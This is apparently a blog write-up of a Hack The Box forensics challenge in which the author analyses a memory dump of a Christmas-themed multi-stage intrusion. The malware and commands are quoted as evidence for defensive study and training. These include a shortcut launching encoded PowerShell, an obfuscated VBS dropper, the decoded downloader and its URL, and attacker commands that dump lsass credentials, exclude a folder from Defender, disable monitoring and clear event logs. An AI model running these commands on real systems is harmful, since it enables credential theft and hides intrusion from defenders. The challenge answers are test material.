---
layout: post
title:  "Sherlocks - OpTinselTrace-3"
category: HTB
---
{% include htb_sherlock.html title="OpTinselTrace-3" difficulty="Medium" scenario="Oh no! Our IT admin is a bit of a cotton-headed ninny-muggins, ByteSparkle left his VPN configuration file in our fancy private S3 location! The nasty attackers may have gained access to our internal network. We think they compromised one of our TinkerTech workstations. Our security team has managed to grab you a memory dump - please analyse it and answer the questions! Santa is waiting…" %}

# Tasks

1. [What is the name of the file that is likely copied from the shared folder (including the file extension)?](#1-what-is-the-name-of-the-file-that-is-likely-copied-from-the-shared-folder-including-the-file-extension)
2. [What is the file name used to trigger the attack (including the file extension)?](#2-what-is-the-file-name-used-to-trigger-the-attack-including-the-file-extension)
3. [What is the name of the file executed by click_for_present.lnk (including the file extension)?](#3-what-is-the-name-of-the-file-executed-by-click_for_presentlnk-including-the-file-extension)
4. [What is the name of the program used by the vbs script to execute the next stage?](#4-what-is-the-name-of-the-program-used-by-the-vbs-script-to-execute-the-next-stage)
5. [What is the name of the function used for the powershell script obfuscation?](#5-what-is-the-name-of-the-function-used-for-the-powershell-script-obfuscation)
6. [What is the URL that the next stage was downloaded from?](#6-what-is-the-url-that-the-next-stage-was-downloaded-from)
7. [What is the IP and port that the executable downloaded the shellcode from (IP:Port)?](#7-what-is-the-ip-and-port-that-the-executable-downloaded-the-shellcode-from-ipport)
8. [What is the process ID of the remote process that the shellcode was injected into?](#8-what-is-the-process-id-of-the-remote-process-that-the-shellcode-was-injected-into)
9. [After the attacker established a Command & Control connection, what command did they use to clear all event logs?](#9-after-the-attacker-established-a-command--control-connection-what-command-did-they-use-to-clear-all-event-logs)
10. [What is the full path of the folder that was excluded from defender?](#10-what-is-the-full-path-of-the-folder-that-was-excluded-from-defender)
11. [What is the original name of the file that was ingressed to the victim?](#11-what-is-the-original-name-of-the-file-that-was-ingressed-to-the-victim)
12. [What is the name of the process targeted by procdump.exe?](#12-what-is-the-name-of-the-process-targeted-by-procdumpexe)

# Discussion

We have read the scenario, and the tasks we are looking to answer. There are some points of information that we can pull from this, that can assist us in our further analysis.
- A payload was transferred to the victim
- The payload is in multiple stages
- The payload is obfuscated
- It is shellcode

Some of the keywords here are "link", "present", "powershell", and "vbs".

It may not be all the relevant information that we can deduce, but limiting the information that we look for is crucial when sifting through mountains of data.

# Answering the tasks
First, we need to grab the `optinseltrace3.zip` file, and unzip it, it contains a file called `santa_claus.bin`.
This is a memory dump, and we need to use [Volatility](https://github.com/volatilityfoundation/volatility3) for that (or [MemProcFS](https://github.com/ufrisk/MemProcFS))

### 1. What is the name of the file that is likely copied from the shared folder (including the file extension)?
This question was puzzling me for quite some time, but I knew I had to find some files at least - and usually files are copied/downloaded to the `C:\Users` and then `AppData`, `Desktop`, `Documents` or `Downloads`.

{% highlight powershell %}
python vol.py -f optinseltrace3\santaclaus.bin windows.filescan | sls 'Users'
Progress:  100.00               PDB scanning finished
... TRUNCATED ...
0xa48df8fb42a0  \Users\santaclaus\Desktop\present_for_santa.zip 216
... TRUNCATED ...
0xa48df8fd7520  \Users\SANTAC~1\AppData\Local\Temp\present.exe  216
... TRUNCATED ...
{% endhighlight %}

This yields some interesting files, a file called `present_for_santa.zip` and `present.exe`. Let's see if we can salvage those.

{% highlight powershell %}
python vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48df8fb42a0
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xa48df8fb42a0  present_for_santa.zip   file.0xa48df8fb42a0.0xa48dfbf1ba20.DataSectionObject.present_for_santa.zip.dat

python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48df8fd7520
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xa48df8fd7520  present.exe     file.0xa48df8fd7520.0xa48dfe212c30.DataSectionObject.present.exe.dat
ImageSectionObject      0xa48df8fd7520  present.exe     file.0xa48df8fd7520.0xa48dff93a270.ImageSectionObject.present.exe.img

fil .\file.0xa48df8fb42a0.0xa48dfbf1ba20.DataSectionObject.present_for_santa.zip.dat
.\file.0xa48df8fb42a0.0xa48dfbf1ba20.DataSectionObject.present_for_santa.zip.dat:   Zip archive data
fil .\file.0xa48df8fd7520.0xa48dfe212c30.DataSectionObject.present.exe.dat
.\file.0xa48df8fd7520.0xa48dfe212c30.DataSectionObject.present.exe.dat:   MS PE32+ executable console x86-64
{% endhighlight %}

I'm using [fil](https://github.com/file-go/fil) which is an equivalent for `file` from Linux, just one that works on Windows.

Either way, we've pulled two files out from the memory dump with Volatility, so let's take a peek inside the zip archive.

![present_for_santa.zip](/img/htb/sherlock/optinseltrace-3/present_for_santa.png)

Well, this looks suspiciously like a payload. I think this zip file is the one of the first things in the attack chain.

{% include htb_flag.html id="1" description="What is the name of the file that is likely copied from the shared folder (including the file extension)?" flag="present_for_santa.zip" %}

### 2. What is the file name used to trigger the attack (including the file extension)?

When we are looking at the zip contents, we see a `lnk` shortcut file, and a `VB Script` file. Let's check out the shortcut file with [LECmd](https://ericzimmerman.github.io/#!index.md):
{% highlight powershell %}
LECmd.exe -f .\click_for_present.lnk
LECmd version 1.5.0.0

... TRUNCATED ...

Name: Trick or treat
Relative Path: ..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Arguments: -ep bypass -enc JABmAGkAbABlACAAPQAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAEMAOgBcAFUAcwBlAHIAcwBcACIAIAAtAEYAaQBsAHQAZQByACAAIgBwAHIAZQBzAGUAbgB0ACoALgB2AGIAcwAiACAALQBGAGkAbABlACAALQBSAGUAYwB1AHIAcwBlAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABGAHUAbABsAE4AYQBtAGUAOwBjAHMAYwByAGkAcAB0ACAAJABmAGkAbABlAA==
Icon Location: C:\Windows\System32\shell32.dll

... TRUNCATED ...
{% endhighlight %}

The execution policy is set to Bypass, and it passes an encoded PowerShell string - seems like a trigger. Let's just check that the encoded command does.
[CyberChef](https://gchq.github.io/CyberChef/) can assist us here, PowerShell encoded commands are usually Base64 encoded, UTF16-LE.

![cyberchef_lnk](/img/htb/sherlock/optinseltrace-3/cyberchef_lnk.png)
{% highlight powershell %}
$file = Get-ChildItem -Path "C:\Users\" -Filter "present*.vbs" -File -Recurse| Select-Object -ExpandProperty FullName;cscript $file
{% endhighlight %}

Think we got it. 

{% include htb_flag.html id="2" description="What is the file name used to trigger the attack (including the file extension)?" flag="click_for_present.lnk" %}

### 3. What is the name of the file executed by click_for_present.lnk (including the file extension)?

We did most of the work during the last question, we know which files are being executed (esentially any file starting with `present` and ending with `.vbs` in the users folder)

{% include htb_flag.html id="3" description="What is the name of the file executed by click_for_present.lnk (including the file extension)?" flag="present.vbs" %}

### 4. What is the name of the program used by the vbs script to execute the next stage?

If we check the first 10 lines of the vbs script, we can see something that is slightly annoying

{% highlight powershell %}
Get-Content -Head 10 -Path .\present.vbs
Nonphilosophicalgloriat = LenB("Ritualizing")

'Monetizing25 Muting
'Felttegn Semiparasitism Desalinizing
'Infeminine Milksoppery Theol
'Nephrohypertrophy slotsprsts Uhensigtsmssighedens Landegrnser58 Ophidset
'Esca marinist
'Sprkkedal Kompetenceforskydningen24 Idiolalia Steters Viscerosensory
'Fllestillidsmand Oldland Henpecking Albatrosen
'Jonahesque Intubatting forureningsbekmpelsens Boltens Nightwards
{% endhighlight %}

For one, there is words here that are Danish, so I can't help but read them when trying to deobfuscate. 
Other than that, comments in vbs starts with a single qoute `'` or `rem` - so let's remove all lines starting with a comment and empty lines.

{% highlight powershell %}
Get-Content -Path .\present.vbs | sls -NotMatch "'" | sls -NotMatch "^$"

Nonphilosophicalgloriat = LenB("Ritualizing")
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Private Const Overcrammi = &HFFFFB15F
Private Const Rdkridtet = &HFFFFB96E
Private Const Delarbejdets = -19974
Private Const Sammentraengte = "Atokal Becram Latchkeys"
Private Const Tlleapparaternes = "Tropikfronters Udludningen Uigenkaldeliges122 Gunsels"
Private Const Dispergeringsmidlers = "Homostyled Tiltuskede"
Private Const Indlejrende = -36431
Private Const Iteratively = "Rhyptical Stetoskopers"
Private Const Spadillers = "Decursive consubstantialism"
Private Const Gemenheden136 = "Afstumpningens Elusiveness Encirclements"
Private Const kromosomernes = "fells Fastballs Laron"
Private Const Insures = "Forsvarlige ydernes Approachens"
Private Const Medianens = -11670
Private Const Udviklingspsykologerne = &HDCEC
Private Const Afrustet = "Ceded Prajene Linkages"
Private Const Hyperalgebra228 = &HFFFFB5B0
Private Const Overrapturize = -45841
Private Const Sandormene = 21903
Private Const Ravenhood = "Outwrites Negligibly"
Private Const Zara = -40317
Private Const Landsforeningers = &HFFFF612F
Private Const Spulings = 53917
Private Const Forfjerdinger = &HFFFF1B6F
Private Const Matus = -64522
Private Const omskrendes = &HFFFF2EBE
Private Const Udpolstringerne70 = &HFFFF4034
Private Const Grandmother241 = -15586
Private Const Studeopdrtters = -10206
Private Const Elisas = "Redeployment Leglet"
Private Const Panicking = "Seriously Noisiest"
Private Const Rdhud = 64782
Private Const Rebelly = "Absenteringers Paleodendrologic Stvfrakkernes Suspenderendes"
Private Const Davon = -62249
Private Const Korsfst = &HCEA8
Private Const Busstoppestederne = 52451
Private Const Undladtes = &HFFFFBCBF
Private Const Idiologism = -21819
Private Const Kokoromiko = &HFFFF0BF2
Private Const Skalken = &H8570
Private Const Stribningens = -8436
Private Const Synthesization = "Graags157 Helligtrekongers Lillefingrene"
Private Const Lydbaands = 63620
Private Const Omphalodia = -38461
Private Const Butyrousness = "Witting Blokhaandteringens"
Private Const chirogymnast = "Smsyning blackballed"
Set colProcess = objWMIService.ExecQuery ("Select * from Win32_Process")
Modulidae = "WScript." & "Shell"
Set Firklverne = CreateObject(Modulidae)
For Each objProcess in colProcess
    bb=instr(1,objProcess.Name,"s",vbTextCompare)
        if bb <> 0 then exit for
Next
Unrustling = mid(objProcess.Name,bb,1)
Aadselsbilles = "power" & Unrustling & "hell "
Tetrafluoridepr196 = Log(883567)
A4 = A4 + "sproglGRINCHg){"
superassociatepa = Right("Myriacanthous157",38)
A4 = A4 + "RINCHcs thst de"
Fulyiehasteindkaldel = MidB("Recirkulerede", 198, 100)
A4 = A4 + "dwelleGRINCH GR"
Momusesfarvefabr = Momusesfarvefabr & "Organbird"
A4 = A4 + "spesed thn joyo"
Fyringsgasoliensyttendede = FormatDateTime("12/12/12")
A4 = A4 + "ut celebLatGRIN"
Voguishnesspencillersga = MidB("Nonsacredly", 5, 201)
A4 = A4 + "RINCHn$er holed"
while (Vrdihfteslarsonaandsviden<88)
Vrdihfteslarsonaandsviden = Vrdihfteslarsonaandsviden + 1
Fornyelsesbevgelseh = Fornyelsesbevgelseh * (1+1)
wend
Underkendelseskla = Rnd
A4 = A4 + "bsGRINCHmmGRINC"
Clodknockerfejlretableri = Now
A4 = A4 + "t GRINCHng up$d"
Sparkletmendiecri = Sparkletmendiecri & "Upjerk" & "Sakieh"
A4 = A4 + ", lnd sGRINCHnu"
Lazarouswonderst = Split("Sanativeness")
A4 = A4 + "ked wGRINCHs lG"
Livsenergienssabbat = Right("Chics",67)
A4 = A4 + "esteve tranGRIN"
Hitchiestlailahsmiljmini = FormatPercent(4686710)
A4 = A4 + "CHtGRINCHonstal"
Fiberrigejordblonderme = "Janie" & "Lovering187" & "Bldersygdommene"
A4 = A4 + "INCHon dGRINCHo"
Panelersbatturegensk = FormatNumber(812904)
A4 = A4 + "NCHag the towns"
Flyvekkkenernescocamamab = "Nilghais"
Flyvekkkenernescocamamab = Replace(Flyvekkkenernescocamamab,"Humdrumminess","Galilernes")
A4 = A4 + "RINCHpGRINCHt t"
Prosadigtetsundia = Prosadigtetsundia * 3889211
A4 = A4 + ""
Renkulturenkopip = Split("Feeblebrained")
A4 = A4 + ""
Aflejretgnomologicaludm = Aflejretgnomologicaludm & "outcome"

A4 = Replace(A4,"GRINCH","i")
Rostellariaholdarb = LCAse("Tevandskngts")
Firklverne.Run Aadselsbilles + Chr(34) + A4 + Chr(34),0

{% endhighlight %}

Often with obfuscation, the author likes to thrown in a bunch of random information to throw you off. 

I notice a few things here, mainly `Aadselsbilles = "power" & Unrustling & "hell "` - this gets translated into `powershell`, and we also see the final line `Firklverne.Run Aadselsbilles + Chr(34) + A4 + Chr(34),0` which translates roughly into `powershell "$A4"`. 34 is the ASCII character for double quotes, and A4 in our VB Script seems like the interesting part. Let's make a note of that and answer which file is being executed.

{% include htb_flag.html id="4" description="What is the name of the program used by the vbs script to execute the next stage?" flag="powershell.exe" %}

### 5. What is the name of the function used for the powershell script obfuscation?

We have already figured out that A4 is something we are looking for, let's find all lines referencing A4.

{% highlight powershell %}
(Get-Content -Path .\present.vbs | sls 'A4') -replace "'.*"
A4 = A4 + "FunctGRINCHon W"
A4 = A4 + "rapPresent ($En"
A4 = A4 + "sproglGRINCHg){"

... TRUNCATED ...

A4 = Replace(A4,"GRINCH","i")

{% endhighlight %}

Looking at it, it seems like we need to concatenate all the A4 strings into a single string, and replace every instance of `GRINCH` with `i`.

{% highlight powershell %}

(Get-Content -Path .\present.vbs | sls 'A4 = A4 \+') -replace "`"'.*","`"" -replace 'A4 = A4 \+ ' -replace '"' -join '' -replace "GRINCH","i"
Function WrapPresent ($Ensproglig){$Nringsvirksomhedernes = $Ensproglig.Length-1; For ($Smiths211=6; $Smiths211 -lt $Nringsvirksomhedernes){$Malice=$Malice+$Ensproglig.Substring($Smiths211, 1);$Smiths211+=7;}$Malice;};$present=WrapPresent 'Once uhon a ttme, intthe whpmsical:town o/ Holid/y Holl7w, the7e live. two l7gendar4 figur.s know1 far a9d wide8 the G.inch a5d Sant2 Claus/ They desidedeon oppssite stdes ofrthe toon, eacy with _heir ocn uniqhe charrcterisiics thst defited them. The arinch,sa soli/ary creature,vdwellei in a lave at_p Mounp Crumprt. Wite his gseen fue and anheart teeming.y two jizes tpo smalg, he h';$gluhwein=WrapPresent 'd a peichant eor misxhief a';. ($gluhwein) (WrapPresent in fpr anyteing fertive. se despesed thn joyout celebLationsothat echoed tarough the towi, espeoially nuring =he win$er holedays. nn the vther s:de of tolidayeHollowm nestlpd in ac');$File=WrapPresent 'cozy w\rkshoppat therNorth eole, lsved the jollynand betevolen. SantaeClaus.xWith hes roun';. ($gluhwein) (WrapPresent ' belly$ rosy pheeks,eand a reart bsimmingewith knndnesst he spLnt hisodays ccaftingatoys ftr chiliren around thn world=and sp$eadingpcheer eherever he west. Yeae afternyear, ts the Lolidayoseasoncapproaahed, tte townifolk eogerly nrepare+ for f$stivitFes, adirning lhe streets wih');. ($gluhwein) (WrapPresent 'h ligh.s, set ing up$decoragions, lnd sinuing johful tuwes. Whele Sania businy prep red hi( sleigN and ceecked wis lis- twiceO the Gbinch sjethed en his cave, itritate  by thn merrieent thtt fill.d the wir. One fatefbl wintcr, a plrticulirly ice chillnswept through)Holida. HolloD, causong chaws and nisruptlng theoholidaa spirid. The Fnowstoims grel wildee, and (he tow$sfolk ptrugglrd to keep thesr festeve tranitionstalive.,Childr$n werepdisappeinted rs the srospece of a noyous telebraLion diomed. Wctnessiag the towns distresso Santanknew h) had t; do soe');. ($gluhwein) (WrapPresent 'ethingSto restore tha holidry cheet. With-a twinPle in ris eyeoand a ceart fell of sope, hs decid d to p$y a vipit to ehe Grirch, hosing toewarm hns heart and bLing baok the cpirit af the teason.iGuidedoby hisnunyiel;i');

{% endhighlight %}

At a glance, I only spot one function `WrapPresent`.

{% include htb_flag.html id="5" description="What is the name of the function used for the powershell script obfuscation?" flag="WrapPresent" %}

### 6. What is the URL that the next stage was downloaded from?

Once we have the deobfuscated PowerShell script, it may help us if we pretty-print it and hope it helps us to better understand what it does.

{% highlight powershell %}
Function WrapPresent ($Ensproglig)
    {
        $Nringsvirksomhedernes = $Ensproglig.Length-1
        For ($Smiths211=6; $Smiths211 -lt $Nringsvirksomhedernes)
            {
                $Malice=$Malice+$Ensproglig.Substring($Smiths211, 1)
                $Smiths211+=7
            }
        $Malice
    }

$present=WrapPresent 'Once uhon a ttme, intthe whpmsical:town o/ Holid/y Holl7w, the7e live. two l7gendar4 figur.s know1 far a9d wide8 the G.inch a5d Sant2 Claus/ They desidedeon oppssite stdes ofrthe toon, eacy with _heir ocn uniqhe charrcterisiics thst defited them. The arinch,sa soli/ary creature,vdwellei in a lave at_p Mounp Crumprt. Wite his gseen fue and anheart teeming.y two jizes tpo smalg, he h'
$present
http://77.74.198.52/destroy_christmas/evil_present.jpg
{% endhighlight %}

We found the content of the `$present` variable, which is fetched by another function.

{% include htb_flag.html id="6" description="What is the URL that the next stage was downloaded from?" flag="http://77.74.198.52/destroy_christmas/evil_present.jpg" %}

### 7. What is the IP and port that the executable downloaded the shellcode from (IP:Port)?
We can turn to [Ghidra](https://ghidra-sre.org/) when we need to reverse an application or simply upload this file to a site like VirusTotal and see the sockets the application creates.
#### Virus Total
If we decide to use Virus Total, we can use [vt-cli](https://github.com/VirusTotal/vt-cli) or [virustotal.com](https://virustotal.com).

First off, we'll send the file for analysis to VT:
{% highlight bash %}
$ vt scan file file.0xa48e003d0530.0xa48dfe212c30.DataSectionObject.present.exe.dat
file.0xa48e003d0530.0xa48dfe212c30.DataSectionObject.present.exe.dat Y2FhZDY3OTQyMGIwMDc0YWIxMjA0MDhjZDhjNDk1ZGI6MTcwMzk3MDQwOA==
{% endhighlight %}

Once done, we need to wait a while as the file is queued for analysis. We also need to decode the returned Base64 to use that for connectivity check, the decoded value contains a `:` and we need to remove the data after that.
{% highlight bash %}
$ echo 'Y2FhZDY3OTQyMGIwMDc0YWIxMjA0MDhjZDhjNDk1ZGI6MTcwMzk3MDQwOA=='| base64 -d | cut -d ':' -f 1
caad679420b0074ab120408cd8c495db
{% endhighlight %}

{% highlight bash %}
$ vt file behaviours caad679420b0074ab120408cd8c495db --format json | jq '.[] | select(.ip_traffic) | .ip_traffic | .[] | [.destination_ip, .destination_port] | @csv'
"\"20.99.185.48\",443"
"\"192.229.211.108\",80"
"\"23.209.116.9\",443"
"\"20.99.184.37\",443"
"\"20.99.186.246\",443"
"\"77.74.198.52\",445"
"\"77.74.198.52\",445"
{% endhighlight %}

#### Analysis, Ghidra

![present_calls](/img/htb/sherlock/optinseltrace-3/present_calls.png)

We could also run the file on a device behind a [REMnux](https://remnux.org/) machine for instance or similar, to show the connections. But it seems like it's using the `WS2_32.dll` library to do a call on port 445. The IP address is luckily in clear text.

NOTE: user `tmechen` had a bit more luck with analyzing in Ghidra and provided a screenshot which shows the usage of [htons()](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons) function, which indeed is the port number as previously assumed.
![present_port](/img/htb/sherlock/optinseltrace-3/present_port.png)

{% include htb_flag.html id="7" description="What is the IP and port that the executable downloaded the shellcode from (IP:Port)?" flag="77.74.198.52:445" %}

### 8. What is the process ID of the remote process that the shellcode was injected into?

If we again turn to Volatility, and check the network connections with the `windows.netscan` module, and search for the IP from which the shellcode was acquired

{% highlight powershell %}
python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.netscan | sls '77\.74\.198\.52'
Progress:  100.00               PDB scanning finished
0xa48df88db790  TCPv4   192.168.68.6    49687   77.74.198.52    447     ESTABLISHED     724     svchost.exe     2023-11-30 16:42:41.000000
{% endhighlight %}

The 8th column is our Process ID / PID.

{% include htb_flag.html id="8" description="What is the process ID of the remote process that the shellcode was injected into?" flag="724" %}

### 9. After the attacker established a Command & Control connection, what command did they use to clear all event logs?

We need to find out which command was run, and if we use the `windows.cmdline` module, it will only show the processed that were running at the time. The question indicates something was done prior to the data collection. So let's see if we can find a suiting Windows Eventlog in the filescan module.

{% highlight powershell %}
python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.filescan | sls evtx
Progress:  100.00               PDB scanning finished
0xa48dfefe6e50  \Windows\System32\winevt\Logs\Windows PowerShell.evtx   216

python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48dfefe6e50
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xa48dfefe6e50  Windows PowerShell.evtx Error dumping file
SharedCacheMap  0xa48dfefe6e50  Windows PowerShell.evtx file.0xa48dfefe6e50.0xa48dfef8b010.SharedCacheMap.Windows PowerShell.evtx.vacb

{% endhighlight %}

Lets rename the file so we can open it with `Get-WinEvent`
{% highlight powershell %}
mv '.\file.0xa48dfefe6e50.0xa48dfef8b010.SharedCacheMap.Windows PowerShell.evtx.vacb' '.\file.0xa48dfefe6e50.0xa48dfef8b010.SharedCacheMap.Windows PowerShell.evtx'
{% endhighlight %}

Once again I descend into oneliner hell. Sorry.
We are reading the `evtx`, then selection the content of the Message (what you see in the bottom pane of the Event Viewer), then getting all lines that matches the HostApplication regex, and printing out the values from the match.

{% highlight powershell %}
> (((Get-Winevent -Path '.\file.0xa48dfefe6e50.0xa48dfef8b010.SharedCacheMap.Windows PowerShell.evtx').Message | sls 'HostApplication=(.*)').Matches).Value
HostApplication=powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp
HostApplication=powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp
HostApplication=powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp
HostApplication=powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp
HostApplication=powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp
HostApplication=powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp
HostApplication=powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp
HostApplication=powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp
HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
HostApplication=powershell.exe Add-MpPreference -DisDisableRealtimeMonitoring True
HostApplication=powershell.exe Add-MpPreference -DisDisableRealtimeMonitoring True
HostApplication=powershell.exe Add-MpPreference -DisDisableRealtimeMonitoring True
HostApplication=powershell.exe Add-MpPreference -DisDisableRealtimeMonitoring True
HostApplication=powershell.exe Add-MpPreference -DisDisableRealtimeMonitoring True
HostApplication=powershell.exe Add-MpPreference -DisDisableRealtimeMonitoring True
HostApplication=powershell.exe Add-MpPreference -DisDisableRealtimeMonitoring True
HostApplication=powershell.exe Add-MpPreference -DisDisableRealtimeMonitoring True
HostApplication=powershell.exe Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
{% endhighlight %}

In any case, the last command is what we are looking for.

{% include htb_flag.html id="9" description="After the attacker established a Command & Control connection, what command did they use to clear all event logs?" flag="Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }" %}

### 10. What is the full path of the folder that was excluded from defender?

From our output in #9, we also get the answer by the command `Add-MpPreference`

{% include htb_flag.html id="10" description="What is the full path of the folder that was excluded from defender?" flag="C:\users\public" %}

### 11. What is the original name of the file that was ingressed to the victim?

If we read the next question, we get the answer. But what we should be doing, would be to extract the file from memory and investigate it with [PEStudio](https://www.winitor.com) or similar.

{% highlight powershell %}
python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48e00d10a90
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xa48e00d10a90  PresentForNaughtyChild.exe      file.0xa48e00d10a90.0xa48dfe2179b0.DataSectionObject.PresentForNaughtyChild.exe.dat
ImageSectionObject      0xa48e00d10a90  PresentForNaughtyChild.exe      file.0xa48e00d10a90.0xa48e005f02a0.ImageSectionObject.PresentForNaughtyChild.exe.img
{% endhighlight %}

![ProcDump](/img/htb/sherlock/optinseltrace-3/procdump.png)

{% include htb_flag.html id="11" description="What is the original name of the file that was ingressed to the victim?" flag="procdump.exe" %}

### 12. What is the name of the process targeted by procdump.exe?

This is also answered in #9, but the command `powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp` tells us that they are creating a dump of the `lsass.exe` process.

{% include htb_flag.html id="12" description="What is the name of the process targeted by procdump.exe?" flag="lsass.exe" %}

## Congratulations

You've have pwned OpTinselTrace-3